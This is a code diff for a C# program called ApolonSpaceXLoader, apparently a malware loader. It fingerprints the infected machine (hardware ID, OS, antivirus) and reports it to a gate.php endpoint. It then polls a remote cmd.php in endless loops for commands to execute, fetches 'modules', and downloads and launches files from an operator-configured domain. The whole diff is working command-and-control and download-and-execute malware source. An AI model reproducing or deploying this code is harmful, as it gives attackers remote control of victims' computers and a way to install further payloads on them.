@@ -4,18 +4,16 @@ using System.Text;
 using System.Diagnostics;
 using System.Threading;
 using System.IO;
+using System.Threading.Tasks;
 
 namespace ApolonSpaceXLoader
 {
     class Program
     {
-        private static EventWaitHandle ewh;
-        private static long threadCount = 0;
-        private static EventWaitHandle clearCount = new EventWaitHandle(false, EventResetMode.AutoReset);
+        public static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Paste your domain, read description!"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
 
-        private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Domain"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
-        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
-        public static string urlPage = string.Concat(dom, "/loader.txt");
+        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}", urlPage = string.Concat(dom, "/loader.txt");
+        public static string oldCommand { get; set; }
 
         [MTAThread]
         static void Main(string[] args)
@@ -25,20 +23,48 @@ namespace ApolonSpaceXLoader
                 Environment.Exit(1);
             }
             MyRegistry.Check();
-            ewh = new EventWaitHandle(false, EventResetMode.AutoReset);
 
-            Thread t = new Thread(Work);
-            t.Start();
-
-            while (Interlocked.Read(ref threadCount) < 1)
+            Task.Run(() =>
             {
-                Thread.Sleep(3000);
-            }
-
-            while (Interlocked.Read(ref threadCount) > 0)
+                while (true)
+                {
+                    Work();
+                    Thread.Sleep(5000);
+                }
+            });
+            Task.Run(() =>
             {
-                WaitHandle.SignalAndWait(ewh, clearCount);
-            }
+                // Load the modules when starting the system
+                MyModules.NewSession();
+                while (true)
+                {
+                    // Checking for new modules
+                    if (MyModules.CheckNewModules())
+                    {
+                        // Loading these modules
+                        MyModules.DownloadModules();
+                    }
+                    Thread.Sleep(5000);
+                }
+            });
+            Task.Run(() =>
+            {
+                
+                while (true)
+                {
+                    using (WebClient wc = new WebClient())
+                    {
+                        string newCommand = wc.DownloadString(dom + "/cmd.php");
+                        if (newCommand != oldCommand && newCommand != MyRegistry.GetLastCommand() && newCommand != string.Empty)
+                        {
+                            SConsole.CVoid(newCommand);
+                            MyRegistry.UpdateCommand(newCommand);
+                            oldCommand = newCommand;
+                        }
+                    }
+                    Thread.Sleep(5000);
+                }
+            });
         }
 
         private static void Work()
@@ -69,20 +95,15 @@ namespace ApolonSpaceXLoader
                                 if (MyRegistry.GetURL() != null)
                                 {
                                     wc.DownloadFile(new Uri(urlOnPage), dropPath);
-                                    Process.Start(dropPath);
+
+                                    Process.Start("Explorer.exe", dropPath);
                                 }
                             }
                         }
                     }
-                    ewh.Set();
-                    clearCount.Set();
                 }
             }
-            catch
-            {
-                ewh.Set();
-                clearCount.Set();
-            }
+            catch { }
         }
     }
 }
